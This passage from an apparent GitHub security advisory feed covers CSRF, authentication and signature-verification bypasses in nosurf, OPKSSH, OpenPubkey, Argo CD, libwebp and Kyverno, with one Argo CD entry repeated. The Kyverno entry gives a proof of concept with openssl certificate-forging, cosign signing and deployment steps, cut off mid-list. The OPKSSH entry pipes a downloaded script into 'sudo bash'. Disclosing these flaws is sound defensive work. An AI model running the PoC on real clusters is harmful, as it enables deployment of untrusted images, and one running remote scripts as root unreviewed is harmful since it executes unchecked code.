        <title type="html"><![CDATA[[github.com/justinas/nosurf] nosurf vulnerable to CSRF due to non-functional same-origin request checks]]></title>
        <id>https://github.com/advisories/GHSA-w9hf-35q4-vcjw</id>
        <link href="https://github.com/advisories/GHSA-w9hf-35q4-vcjw"/>
        <updated>2025-05-14T14:56:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This vulnerability allows an attacker who controls content on the target site, or on a subdomain of the target site (either via XSS, or otherwise) to bypass Cross-Site Request Forgery checks and issue requests on user's behalf.</p>
<h3 id="details">Details</h3>
<p>Due to misuse of the Go <code>net/http</code> library, nosurf categorizes all incoming requests as plain-text HTTP requests, in which case the <code>Referer</code> header is not checked to have the same origin as the target webpage.</p>
<p>If the attacker has control over HTML contents on either the target website (e.g. <code>example.com</code>), or on a website hosted on a subdomain of the target (e.g. <code>attacker.example.com</code>), they will also be able to manipulate cookies set for the target website. By acquiring the secret CSRF token from the cookie, or overriding the cookie with a new token known to the attacker, <code>attacker.example.com</code> is able to craft cross-site requests to <code>example.com</code>. </p>
<h3 id="patches">Patches</h3>
<p>A patch for the issue was released in nosurf 1.2.0.</p>
<h3 id="workarounds">Workarounds</h3>
<p>In lieu of upgrading to a patched version of nosurf, users may additionally use another HTTP middleware to ensure that a non-safe HTTP request is coming from the same origin (e.g. by requiring a <code>Sec-Fetch-Site: same-origin</code> header in the request).</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/advisories/GHSA-rq77-p4h8-4crw">https://github.com/advisories/GHSA-rq77-p4h8-4crw</a>
<a href="https://github.com/justinas/nosurf-cve-2025-46721">https://github.com/justinas/nosurf-cve-2025-46721</a>
<a href="https://www.cve.org/CVERecord?id=CVE-2025-46721">https://www.cve.org/CVERecord?id=CVE-2025-46721</a>
<a href="https://github.com/justinas/nosurf/releases/tag/v1.2.0">https://github.com/justinas/nosurf/releases/tag/v1.2.0</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/justinas/nosurf/security/advisories/GHSA-w9hf-35q4-vcjw">https://github.com/justinas/nosurf/security/advisories/GHSA-w9hf-35q4-vcjw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-46721">https://nvd.nist.gov/vuln/detail/CVE-2025-46721</a></li>
<li><a href="https://github.com/justinas/nosurf/commit/ec9bb776d8e5ba9e906b6eb70428f4e7b009feee">https://github.com/justinas/nosurf/commit/ec9bb776d8e5ba9e906b6eb70428f4e7b009feee</a></li>
<li><a href="https://github.com/advisories/GHSA-rq77-p4h8-4crw">https://github.com/advisories/GHSA-rq77-p4h8-4crw</a></li>
<li><a href="https://github.com/justinas/nosurf-cve-2025-46721">https://github.com/justinas/nosurf-cve-2025-46721</a></li>
<li><a href="https://github.com/justinas/nosurf/releases/tag/v1.2.0">https://github.com/justinas/nosurf/releases/tag/v1.2.0</a></li>
<li><a href="https://github.com/advisories/GHSA-w9hf-35q4-vcjw">https://github.com/advisories/GHSA-w9hf-35q4-vcjw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w9hf-35q4-vcjw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-05-14T14:56:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/openpubkey/opkssh] OPKSSH Vulnerable to Authentication Bypass ]]></title>
        <id>https://github.com/advisories/GHSA-56wx-66px-9j66</id>
        <link href="https://github.com/advisories/GHSA-56wx-66px-9j66"/>
        <updated>2025-05-13T21:35:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Versions of OpenPubkey library prior to 0.10.0 contained a vulnerability that would allow a specially crafted JWS to bypass signature verification. As OPKSSH depends on the OpenPubkey library for authentication, this vulnerability in OpenPubkey also applies to OPKSSH versions prior to 0.5.0 and would allow an attacker to bypass OPKSSH authentication.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability does not exist in more recent versions of OPKSSH. his only impacts OPKSSH  when used to verify ssh keys on a server, the OPKSSH client is unaffected. To remediate upgrade to a version of OPKSSH v0.5.0 or greater.</p>
<p>To determine if you are vulnerable run on your server:</p>
<pre><code class="language-bash">opkssh --version
</code></pre>
<p>If the version is less than 0.5.0 you should upgrade. To upgrade to the latest version run:</p>
<pre><code class="language-bash">wget -qO- "https://raw.githubusercontent.com/openpubkey/opkssh/main/scripts/install-linux.sh" | sudo bash
</code></pre>
<h3 id="references">References</h3>
<p><a href="https://www.cve.org/CVERecord?id=CVE-2025-4658">CVE-2025-4658</a></p>
<p>The upstream vulnerability in OpenPubkey is <a href="https://www.cve.org/CVERecord?id=CVE-2025-3757">CVE-2025-3757</a> and has the security advisory <a href="https://github.com/openpubkey/openpubkey/security/advisories/GHSA-537f-gxgm-3jjq">https://github.com/openpubkey/openpubkey/security/advisories/GHSA-537f-gxgm-3jjq</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/openpubkey/opkssh/security/advisories/GHSA-56wx-66px-9j66">https://github.com/openpubkey/opkssh/security/advisories/GHSA-56wx-66px-9j66</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-4658">https://nvd.nist.gov/vuln/detail/CVE-2025-4658</a></li>
<li><a href="https://github.com/openpubkey/opkssh">https://github.com/openpubkey/opkssh</a></li>
<li><a href="https://github.com/advisories/GHSA-56wx-66px-9j66">https://github.com/advisories/GHSA-56wx-66px-9j66</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-56wx-66px-9j66</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-05-13T21:34:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/openpubkey/openpubkey] OpenPubkey Vulnerable to Authentication Bypass]]></title>
        <id>https://github.com/advisories/GHSA-537f-gxgm-3jjq</id>
        <link href="https://github.com/advisories/GHSA-537f-gxgm-3jjq"/>
        <updated>2025-05-13T21:34:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Versions of OpenPubkey library prior to 0.10.0 contained a vulnerability that would allow a specially crafted JWS to bypass signature verification.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to v0.10.0 or greater. This vulnerability is not present in versions of OpenPubkey after v0.9.0. </p>
<h3 id="references">References</h3>
<p><a href="https://www.cve.org/CVERecord?id=CVE-2025-3757">CVE-2025-3757 </a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/openpubkey/openpubkey/security/advisories/GHSA-537f-gxgm-3jjq">https://github.com/openpubkey/openpubkey/security/advisories/GHSA-537f-gxgm-3jjq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-3757">https://nvd.nist.gov/vuln/detail/CVE-2025-3757</a></li>
<li><a href="https://github.com/advisories/GHSA-537f-gxgm-3jjq">https://github.com/advisories/GHSA-537f-gxgm-3jjq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-537f-gxgm-3jjq</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-05-13T21:34:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v2] Controller reconciles apps outside configured namespaces when sharding is enabled]]></title>
        <id>https://github.com/advisories/GHSA-6p4m-hw2h-6gmw</id>
        <link href="https://github.com/advisories/GHSA-6p4m-hw2h-6gmw"/>
        <updated>2025-05-13T20:56:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>All Argo CD versions starting with 2.5.0-rc1 are vulnerable to an authorization bypass bug which allows a malicious Argo CD user to deploy Applications outside the configured allowed namespaces. </p>
<h4 id="description-of-exploit">Description of exploit</h4>
<p>Reconciled Application namespaces are specified as a comma-delimited list of glob patterns. When sharding is enabled on the Application controller, it does not enforce that list of patterns when reconciling Applications. For example, if Application namespaces are configured to be <code>argocd-*</code>, the Application controller may reconcile an Application installed in a namespace called <code>other</code>, even though it does not start with <code>argocd-</code>.</p>
<p>Reconciliation of the out-of-bounds Application is only triggered when the Application is updated, so the attacker must be able to cause an update operation on the Application resource.</p>
<h4 id="limitations">Limitations</h4>
<p>This bug only applies to users who have explicitly enabled the "apps-in-any-namespace" feature by setting <code>application.namespaces</code> in the argocd-cmd-params-cm ConfigMap or otherwise setting the <code>--application-namespaces</code> flags on the Application controller and API server components. The apps-in-any-namespace feature is in beta as of this Security Advisory's publish date.</p>
<p>The bug is also limited to Argo CD instances where sharding is enabled by increasing the <code>replicas</code> count for the Application controller.</p>
<p>Finally, the AppProjects' <code>sourceNamespaces</code> field acts as a secondary check against this exploit. To cause reconciliation of an Application in an out-of-bounds namespace, an AppProject must be available which permits Applications in the out-of-bounds namespace.</p>
<h3 id="patches">Patches</h3>
<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>
<ul>
<li>v2.5.8</li>
<li>v2.6.0-rc5</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Running only one replica of the Application controller will prevent exploitation of this bug.</p>
<p>Making sure all AppProjects' <code>sourceNamespaces</code> are restricted within the confines of the configured Application namespaces will also prevent exploitation of this bug.</p>
<h3 id="credits">Credits</h3>
<p>Thanks to ChangZhuo Chen (@czchen) for finding the issue and for contributing the fix!</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://argo-cd--10678.org.readthedocs.build/en/10678/operator-manual/app-any-namespace/">Documentation for apps-in-any-namespace</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<ul>
<li>Open an issue in <a href="https://github.com/argoproj/argo-cd/issues">the Argo CD issue tracker</a> or <a href="https://github.com/argoproj/argo-cd/discussions">discussions</a></li>
<li>Join us on <a href="https://argoproj.github.io/community/join-slack">Slack</a> in channel #argo-cd</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-6p4m-hw2h-6gmw">https://github.com/argoproj/argo-cd/security/advisories/GHSA-6p4m-hw2h-6gmw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-22736">https://nvd.nist.gov/vuln/detail/CVE-2023-22736</a></li>
<li><a href="https://github.com/advisories/GHSA-6p4m-hw2h-6gmw">https://github.com/advisories/GHSA-6p4m-hw2h-6gmw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6p4m-hw2h-6gmw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-01-25T19:39:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v2] Controller reconciles apps outside configured namespaces when sharding is enabled]]></title>
        <id>https://github.com/advisories/GHSA-6p4m-hw2h-6gmw</id>
        <link href="https://github.com/advisories/GHSA-6p4m-hw2h-6gmw"/>
        <updated>2025-05-13T20:56:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>All Argo CD versions starting with 2.5.0-rc1 are vulnerable to an authorization bypass bug which allows a malicious Argo CD user to deploy Applications outside the configured allowed namespaces. </p>
<h4 id="description-of-exploit">Description of exploit</h4>
<p>Reconciled Application namespaces are specified as a comma-delimited list of glob patterns. When sharding is enabled on the Application controller, it does not enforce that list of patterns when reconciling Applications. For example, if Application namespaces are configured to be <code>argocd-*</code>, the Application controller may reconcile an Application installed in a namespace called <code>other</code>, even though it does not start with <code>argocd-</code>.</p>
<p>Reconciliation of the out-of-bounds Application is only triggered when the Application is updated, so the attacker must be able to cause an update operation on the Application resource.</p>
<h4 id="limitations">Limitations</h4>
<p>This bug only applies to users who have explicitly enabled the "apps-in-any-namespace" feature by setting <code>application.namespaces</code> in the argocd-cmd-params-cm ConfigMap or otherwise setting the <code>--application-namespaces</code> flags on the Application controller and API server components. The apps-in-any-namespace feature is in beta as of this Security Advisory's publish date.</p>
<p>The bug is also limited to Argo CD instances where sharding is enabled by increasing the <code>replicas</code> count for the Application controller.</p>
<p>Finally, the AppProjects' <code>sourceNamespaces</code> field acts as a secondary check against this exploit. To cause reconciliation of an Application in an out-of-bounds namespace, an AppProject must be available which permits Applications in the out-of-bounds namespace.</p>
<h3 id="patches">Patches</h3>
<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>
<ul>
<li>v2.5.8</li>
<li>v2.6.0-rc5</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Running only one replica of the Application controller will prevent exploitation of this bug.</p>
<p>Making sure all AppProjects' <code>sourceNamespaces</code> are restricted within the confines of the configured Application namespaces will also prevent exploitation of this bug.</p>
<h3 id="credits">Credits</h3>
<p>Thanks to ChangZhuo Chen (@czchen) for finding the issue and for contributing the fix!</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://argo-cd--10678.org.readthedocs.build/en/10678/operator-manual/app-any-namespace/">Documentation for apps-in-any-namespace</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<ul>
<li>Open an issue in <a href="https://github.com/argoproj/argo-cd/issues">the Argo CD issue tracker</a> or <a href="https://github.com/argoproj/argo-cd/discussions">discussions</a></li>
<li>Join us on <a href="https://argoproj.github.io/community/join-slack">Slack</a> in channel #argo-cd</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-6p4m-hw2h-6gmw">https://github.com/argoproj/argo-cd/security/advisories/GHSA-6p4m-hw2h-6gmw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-22736">https://nvd.nist.gov/vuln/detail/CVE-2023-22736</a></li>
<li><a href="https://github.com/advisories/GHSA-6p4m-hw2h-6gmw">https://github.com/advisories/GHSA-6p4m-hw2h-6gmw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6p4m-hw2h-6gmw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-01-25T19:39:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/chai2010/webp] libwebp: OOB write in BuildHuffmanTable]]></title>
        <id>https://github.com/advisories/GHSA-j7hp-h8jx-5ppr</id>
        <link href="https://github.com/advisories/GHSA-j7hp-h8jx-5ppr"/>
        <updated>2025-05-13T20:50:33.000Z</updated>
        <content type="html"><![CDATA[<p>Heap buffer overflow in libwebp allow a remote attacker to perform an out of bounds memory write via a crafted HTML page.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-4863">https://nvd.nist.gov/vuln/detail/CVE-2023-4863</a></li>
<li><a href="https://chromereleases.googleblog.com/2023/09/stable-channel-update-for-desktop_11.html">https://chromereleases.googleblog.com/2023/09/stable-channel-update-for-desktop_11.html</a></li>
<li><a href="https://crbug.com/1479274">https://crbug.com/1479274</a></li>
<li><a href="https://github.com/qnighy/libwebp-sys2-rs/pull/21">https://github.com/qnighy/libwebp-sys2-rs/pull/21</a></li>
<li><a href="https://github.com/qnighy/libwebp-sys2-rs/commit/4560c473a76ec8bd8c650f19ddf9d7a44f719f8b">https://github.com/qnighy/libwebp-sys2-rs/commit/4560c473a76ec8bd8c650f19ddf9d7a44f719f8b</a></li>
<li><a href="https://github.com/webmproject/libwebp/commit/902bc9190331343b2017211debcec8d2ab87e17a">https://github.com/webmproject/libwebp/commit/902bc9190331343b2017211debcec8d2ab87e17a</a></li>
<li><a href="https://bugzilla.suse.com/show_bug.cgi?id=1215231">https://bugzilla.suse.com/show_bug.cgi?id=1215231</a></li>
<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-4863">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-4863</a></li>
<li><a href="https://news.ycombinator.com/item?id=37478403">https://news.ycombinator.com/item?id=37478403</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0060.html">https://rustsec.org/advisories/RUSTSEC-2023-0060.html</a></li>
<li><a href="https://security-tracker.debian.org/tracker/CVE-2023-4863">https://security-tracker.debian.org/tracker/CVE-2023-4863</a></li>
<li><a href="https://github.com/electron/electron/pull/39823">https://github.com/electron/electron/pull/39823</a></li>
<li><a href="https://github.com/electron/electron/pull/39825">https://github.com/electron/electron/pull/39825</a></li>
<li><a href="https://github.com/electron/electron/pull/39826">https://github.com/electron/electron/pull/39826</a></li>
<li><a href="https://github.com/electron/electron/pull/39827">https://github.com/electron/electron/pull/39827</a></li>
<li><a href="https://github.com/electron/electron/pull/39828">https://github.com/electron/electron/pull/39828</a></li>
<li><a href="https://github.com/webmproject/libwebp/releases/tag/v1.3.2">https://github.com/webmproject/libwebp/releases/tag/v1.3.2</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2023/09/msg00015.html">https://lists.debian.org/debian-lts-announce/2023/09/msg00015.html</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2023/09/msg00016.html">https://lists.debian.org/debian-lts-announce/2023/09/msg00016.html</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2023/09/msg00017.html">https://lists.debian.org/debian-lts-announce/2023/09/msg00017.html</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0061.html">https://rustsec.org/advisories/RUSTSEC-2023-0061.html</a></li>
<li><a href="https://security.gentoo.org/glsa/202309-05">https://security.gentoo.org/glsa/202309-05</a></li>
<li><a href="https://www.debian.org/security/2023/dsa-5496">https://www.debian.org/security/2023/dsa-5496</a></li>
<li><a href="https://www.debian.org/security/2023/dsa-5497">https://www.debian.org/security/2023/dsa-5497</a></li>
<li><a href="https://www.debian.org/security/2023/dsa-5498">https://www.debian.org/security/2023/dsa-5498</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/21/4">http://www.openwall.com/lists/oss-security/2023/09/21/4</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/22/1">http://www.openwall.com/lists/oss-security/2023/09/22/1</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/22/3">http://www.openwall.com/lists/oss-security/2023/09/22/3</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/22/4">http://www.openwall.com/lists/oss-security/2023/09/22/4</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/22/5">http://www.openwall.com/lists/oss-security/2023/09/22/5</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/22/6">http://www.openwall.com/lists/oss-security/2023/09/22/6</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/22/7">http://www.openwall.com/lists/oss-security/2023/09/22/7</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/22/8">http://www.openwall.com/lists/oss-security/2023/09/22/8</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/26/1">http://www.openwall.com/lists/oss-security/2023/09/26/1</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/26/7">http://www.openwall.com/lists/oss-security/2023/09/26/7</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/28/1">http://www.openwall.com/lists/oss-security/2023/09/28/1</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/28/2">http://www.openwall.com/lists/oss-security/2023/09/28/2</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/28/4">http://www.openwall.com/lists/oss-security/2023/09/28/4</a></li>
<li><a href="https://github.com/jaredforth/webp/pull/30">https://github.com/jaredforth/webp/pull/30</a></li>
<li><a href="https://github.com/python-pillow/Pillow/pull/7395">https://github.com/python-pillow/Pillow/pull/7395</a></li>
<li><a href="https://github.com/jaredforth/webp/commit/9d4c56e63abecc777df71c702503c3eaabd7dcbc">https://github.com/jaredforth/webp/commit/9d4c56e63abecc777df71c702503c3eaabd7dcbc</a></li>
<li><a href="https://pillow.readthedocs.io/en/stable/releasenotes/10.0.1.html#security">https://pillow.readthedocs.io/en/stable/releasenotes/10.0.1.html#security</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/discussions/6664">https://github.com/ImageMagick/ImageMagick/discussions/6664</a></li>
<li><a href="https://github.com/dlemstra/Magick.NET/releases/tag/13.3.0">https://github.com/dlemstra/Magick.NET/releases/tag/13.3.0</a></li>
<li><a href="https://security.gentoo.org/glsa/202401-10">https://security.gentoo.org/glsa/202401-10</a></li>
<li><a href="https://sethmlarson.dev/security-developer-in-residence-weekly-report-16">https://sethmlarson.dev/security-developer-in-residence-weekly-report-16</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20230929-0011">https://security.netapp.com/advisory/ntap-20230929-0011</a></li>
<li><a href="https://stackdiary.com/critical-vulnerability-in-webp-codec-cve-2023-4863">https://stackdiary.com/critical-vulnerability-in-webp-codec-cve-2023-4863</a></li>
<li><a href="https://www.bentley.com/advisories/be-2023-0001">https://www.bentley.com/advisories/be-2023-0001</a></li>
<li><a href="https://www.bleepingcomputer.com/news/google/google-fixes-another-chrome-zero-day-bug-exploited-in-attacks">https://www.bleepingcomputer.com/news/google/google-fixes-another-chrome-zero-day-bug-exploited-in-attacks</a></li>
<li><a href="https://www.mozilla.org/en-US/security/advisories/mfsa2023-40">https://www.mozilla.org/en-US/security/advisories/mfsa2023-40</a></li>
<li><a href="https://www.vicarius.io/vsociety/posts/zero-day-webp-vulnerability-cve-2023-4863">https://www.vicarius.io/vsociety/posts/zero-day-webp-vulnerability-cve-2023-4863</a></li>
<li><a href="https://adamcaudill.com/2023/09/14/whose-cve-is-it-anyway">https://adamcaudill.com/2023/09/14/whose-cve-is-it-anyway</a></li>
<li><a href="https://blog.isosceles.com/the-webp-0day">https://blog.isosceles.com/the-webp-0day</a></li>
<li><a href="https://en.bandisoft.com/honeyview/history">https://en.bandisoft.com/honeyview/history</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6T655QF7CQ3DYAMPFV7IECQYGDEUIVVT">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6T655QF7CQ3DYAMPFV7IECQYGDEUIVVT</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FYYKLG6CRGEDTNRBSU26EEWAO6D6U645">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FYYKLG6CRGEDTNRBSU26EEWAO6D6U645</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KUQ7CTX3W372X3UY56VVNAHCH6H2F4X3">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KUQ7CTX3W372X3UY56VVNAHCH6H2F4X3</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/OZDGWWMJREPAGKWCJKSCM4WYLANSKIFX">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/OZDGWWMJREPAGKWCJKSCM4WYLANSKIFX</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PYZV7TMKF4QHZ54SFJX54BDN52VHGGCX">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PYZV7TMKF4QHZ54SFJX54BDN52VHGGCX</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WHOLML7N2G5KCAZXFWC5IDFFHSQS5SDB">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WHOLML7N2G5KCAZXFWC5IDFFHSQS5SDB</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WTRUIS3564P7ZLM2S2IH4Y4KZ327LI4I">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WTRUIS3564P7ZLM2S2IH4Y4KZ327LI4I</a></li>
<li><a href="https://github.com/advisories/GHSA-j7hp-h8jx-5ppr">https://github.com/advisories/GHSA-j7hp-h8jx-5ppr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j7hp-h8jx-5ppr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-09-12T15:30:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/kyverno/kyverno] Kyverno ignores subjectRegExp and IssuerRegExp]]></title>
        <id>https://github.com/advisories/GHSA-46mp-8w32-6g94</id>
        <link href="https://github.com/advisories/GHSA-46mp-8w32-6g94"/>
        <updated>2025-05-08T14:51:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Kyverno ignores subjectRegExp and IssuerRegExp while verifying artifact's sign with keyless mode. It allows the attacker to deploy kubernetes resources with the artifacts that were signed by unexpected certificate.</p>
<h3 id="details">Details</h3>
<p>Kyverno checks only subject and issuer fields when verifying an artifact's signature: <a href="https://github.com/Mohdcode/kyverno/blob/373f942ea9fa8b63140d0eb0e101b9a5f71033f3/pkg/cosign/cosign.go#L537">https://github.com/Mohdcode/kyverno/blob/373f942ea9fa8b63140d0eb0e101b9a5f71033f3/pkg/cosign/cosign.go#L537</a>. While there are subjectRegExp and issuerRegExp fields that can also be used for the defining expected subject and issue values. If the last ones are used then their values are not taken in count and there is no actually restriction for the certificate that was used for the image sign.</p>
<h3 id="poc">PoC</h3>
<p>For the successful exploitation attacker needs:</p>
<ul>
<li>Private key of any certificate in the certificate chain that trusted by cosign. It can be certificate that signed by company's self-signed Root CA if they are using their own PKI.</li>
<li>Access to container registry to push artifacts images </li>
<li>Availability to deploy malicious artifacts to the kubernetes cluster</li>
</ul>
<ol>
<li>Generate certificate that will be used for the image signing with the oidcissuer url. That can be done with the Fulcio or manually by using openssl</li>
</ol>
<pre><code># Create self-signed RootCA
openssl req -x509 -newkey rsa:4096 -keyout root-ca-key.pem -sha256 -noenc -days 9999 -subj "/C=AA/L=Location/O=IT/OU=Security/CN=Root Certificate Authority" -out root-ca.pem


# Create request for the intermediate certificate
openssl req -noenc -newkey rsa:4096 -keyout intermediate-ca-key.pem -addext "subjectKeyIdentifier = hash" -addext "keyUsage = critical,keyCertSign" -addext "basicConstraints = critical,CA:TRUE,pathlen:2" -subj "/C=AA/L=Location/O=IT/OU=Security/CN=Intermediate Certificate Authority" -out intermediate-ca.csr

# Issue intermediate cert with RootCA
openssl x509 -req -days 9999 -sha256 -in intermediate-ca.csr -CA root-ca.pem -CAkey root-ca-key.pem -copy_extensions copy -out intermediate-ca.pem

# OID_1_1 is the hexadecimal representation of the oidcissuer url
OID_1_1=$(echo -n "https://me.net" | xxd -p -u)

# Create request for the leaf certificate
openssl req -noenc -newkey rsa:4096 -keyout my-key.pem -addext "subjectKeyIdentifier = hash" -addext "basicConstraints = critical,CA:FALSE" -addext "keyUsage = critical,digitalSignature" -addext "subjectAltName = email:me@me.net" -addext "1.3.6.1.4.1.57264.1.1 = DER:${OID_1_1}" -addext "1.3.6.1.4.1.57264.1.8 = ASN1:UTF8String:https://me.net" -subj "/C=AA/L=Location/O=IT/OU=Security/CN=My Cosign Certificate" -out my-cert.csr

# Issue leaf cert with Intermediate CA
openssl x509 -req -in my-cert.csr -CA intermediate-ca.pem -CAkey intermediate-ca-key.pem -copy_extensions copy -days 9999 -sha256 -out my-cert.pem

# Generate certificates chain
cat intermediate-ca.pem root-ca.pem &gt; cert-chain.pem
</code></pre>
<ol start="2">
<li>Build and push container image</li>
<li>Import key and sign the image with the generated certificate</li>
</ol>
<pre><code>COSIGN_PASSWORD="" cosign import-key-pair --key my-key.pem --output-key-prefix=import-my-key
COSIGN_PASSWORD="" cosign sign $IMAGE_WITH_HASH --tlog-upload=false --cert my-cert.pem --cert-chain cert-chain.pem --key import-my-key.key
</code></pre>
<ol start="3">
<li>Add ClusterPolicy for the Kyverno with the wrong subject and issuer regexp. Adding (Fulcio) Root CA as secret and using it in policy is optional only if cosign cannot trust it:</li>
</ol>
<pre><code>apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: check-image-keyless
spec:
  validationFailureAction: Enforce
  webhookTimeoutSeconds: 30
  rules:
    - name: check-image-keyless
      match:
        any:
        - resources:
            kinds:
              - Pod
      context:
        - name: encodedCert
          apiCall:
            urlPath: "/api/v1/namespaces/kyverno/secrets/fulcio-ca"
            method: GET
            jmesPath: "data.\"fulcio-ca.pem\""
        - name: root
          variable:
            jmesPath: "base64_decode(encodedCert)"
      verifyImages:
      - imageReferences:
        - "&lt;IMAGE_REGEXP&gt;"
        attestors:
        - entries:
          - keyless:
              subjectRegExp: https://ivalid
              issuerRegExp: https://ivalid
              roots: "{{root}}"
              rekor:
                url: &lt;URL_TO_REKOR&gt;
                pubkey: |-
                  -----BEGIN PUBLIC KEY-----
                  ...
                  -----END PUBLIC KEY-----
              ctlog:
                pubkey: |-
                  -----BEGIN PUBLIC KEY-----
                  ...
                  -----END PUBLIC KEY-----
</code></pre>
<ol start="4">
<li>Deploy previously signed image</li>
</ol>
<pre><code>apiVersion: apps/v1
kind: Deployment
metadata:
  labels:
    app: image-sign
  name: image-sign
  namespace: default
spec:
  replicas: 2
  selector:
    matchLabels:
      app: image-sign
  strategy: {}
  template:
    metadata:
      annotations:
      labels:
        app: image-sign
    spec:
      containers:
        - image: &lt;YOUR_IMAGE&gt;
          imagePullPolicy: Always
          name: image-signing
          ports:
            - containerPort: 5000
          resources:
            requests:
              memory: 500Mi
              cpu: 0.1
            limits:
              memory: 2Gi
              cpu: 0.2
      restartPolicy: Always
status: {}
</code></pre>
<ol start="5">
